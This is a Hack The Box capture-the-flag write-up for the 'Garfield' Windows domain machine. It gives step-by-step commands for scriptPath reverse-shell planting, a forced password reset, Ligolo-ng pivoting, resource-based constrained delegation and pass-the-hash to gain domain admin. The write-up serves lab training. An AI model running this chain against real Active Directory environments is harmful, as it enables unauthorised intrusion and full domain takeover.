### HTB Write-Up: Garfield
| Field | Details |
| ------ | ------ |
| Platform | Hack The Box |
| Difficulty | Hard |
| OS | Windows |
| Date | June 28, 2026 |

--------------------------------------------------------------------------------

#### Table of Contents
1. Reconnaissance
2. Enumeration — User Discovery & Permission Analysis
3. Initial Access — scriptPath Attribute Abuse
4. Lateral Movement — ForceChangePassword & Tier 1 Access
5. Network Pivoting — Ligolo-ng Tunneling to RODC
6. Privilege Escalation — RBCD on Read-Only Domain Controller
7. Final Compromise — Domain Admin via Pass-the-Hash

--------------------------------------------------------------------------------

#### 1. Reconnaissance
The first step is to see what services are running on the target. We use **Rustscan** for speed and **Nmap** for detailed information.

**Port Discovery:**
```bash
rustscan -a 10.129.244.207
```
Rustscan identified several open ports including 53 (DNS), 88 (Kerberos), 389 (LDAP), and 5985 (WinRM).

**Detailed Service Scanning:**
```bash
nmap -A -p88,389,445,593,3268,2179 10.129.244.207
```
**Findings:**
The scan reveals the domain name is **garfield.htb** and the hostname is **DC01**. A key detail for Active Directory (AD) exploitation is the **clock skew** of 8 hours, as Kerberos authentication relies on synchronized time.

--------------------------------------------------------------------------------

#### 2. Enumeration — User Discovery & Permission Analysis
##### 2.1 — Username Extraction
Using credentials for `j.arbuckle` (`Th1sD4mnC4t!@1978`), we list all users to see who else is in the domain.
```bash
netexec smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
awk '{print $5}' users > usernames.txt
```
This gave us a list of accounts including `l.wilson` and `l.wilson_adm`.

##### 2.2 — Finding Writable Permissions
In AD, some users have "Write" permission over others, allowing them to change settings. We use **bloodyAD** to find these "hidden" powers.
```bash
bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
```
**Critical Discovery:**
Our user `j.arbuckle` has **WRITE** permission over the user **`l.wilson`**.

--------------------------------------------------------------------------------

#### 3. Initial Access — scriptPath Attribute Abuse
##### 3.1 — The scriptPath Mechanism
The `scriptPath` attribute is a setting that tells Windows to run a specific script from the **SYSVOL** share whenever that user logs in. Since we have Write access to `l.wilson`, we can set this attribute ourselves.

##### 3.2 — Preparing and Uploading the Payload
We create a script called `printerDetect.bat` that contains a reverse shell. We upload it to the `scripts` folder where the Domain Controller expects to find it.
```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat'
```

##### 3.3 — Triggering the Reverse Shell
We now update `l.wilson`'s account to point to our script. When the system checks this user, it will execute our shell.
```bash
bloodyAD --host 10.129.244.207 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v 'printerDetect.bat'
```
We listen for the connection on our machine:
```bash
nc -lnvp 4444
```

--------------------------------------------------------------------------------

#### 4. Lateral Movement — ForceChangePassword & Tier 1 Access
Once we have a shell as `l.wilson`, we find that this user has **ForceChangePassword** rights over `l.wilson_adm`. This allows us to take over the administrative version of the account.

**Resetting the Password:**
```powershell
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```
We verify we can now log in via WinRM and collect the user flag.

--------------------------------------------------------------------------------

#### 5. Network Pivoting — Ligolo-ng Tunneling to RODC
We discover a second machine, **RODC01** (`192.168.100.2`), which is on a private network we cannot reach. We use **Ligolo-ng** to create a "tunnel," allowing our Kali machine to talk to that internal network.

**On Kali:**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
sudo ip route add 192.168.100.0/24 dev ligolo
```
**On the Target:**
```powershell
./agent -connect <KALI_IP>:11601 -ignore-cert
```

--------------------------------------------------------------------------------

#### 6. Privilege Escalation — RBCD on Read-Only Domain Controller
##### 6.1 — Gaining RODC Admin Rights
`l.wilson_adm` is a member of the **Tier 1** group, which has the special permission to add itself to the **RODC Administrators** group.
```bash
bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember "RODC Administrators" 'l.wilson_adm'
```

##### 6.2 — Resource-Based Constrained Delegation (RBCD)
Being an RODC admin gives us `WriteAccountRestrictions`. We abuse this to perform **RBCD**, essentially creating a fake computer and telling the RODC: "Trust this fake computer to act as the Administrator".

**Step 1: Create a fake computer:**
```bash
impacket-addcomputer -computer-name 'FAKEMACHINE' -computer-pass 'FAKEMACHINE123!' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
```
**Step 2: Configure delegation:**
```bash
impacket-rbcd -action write -delegate-from 'FAKEMACHINE$' -delegate-to 'RODC01$' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
```
**Step 3: Request a ticket for the Administrator:**
```bash
impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -altservice host -dc-ip 10.129.244.207 'garfield.htb/FAKEMACHINE$:FAKEMACHINE123!'
```

--------------------------------------------------------------------------------

#### 7. Final Compromise — Domain Admin via Pass-the-Hash
##### 7.1 — Accessing RODC01
We use our new ticket to log into the RODC as Administrator.
```bash
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.129.244.207 garfield.htb/Administrator@RODC01.garfield.htb
```

##### 7.2 — Moving to the Main Domain Controller (DC01)
After getting a reverse shell from RODC01 to bypass the "Double Hop" issue, we obtain the Domain Administrator's hash. We then use **Pass-the-Hash** to log into the main Domain Controller (`DC01`).
```bash
evil-winrm -i 10.129.244.207 -u Administrator -H ee238f6debc752010428f20875b092d5
```
**Root Flag:**
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
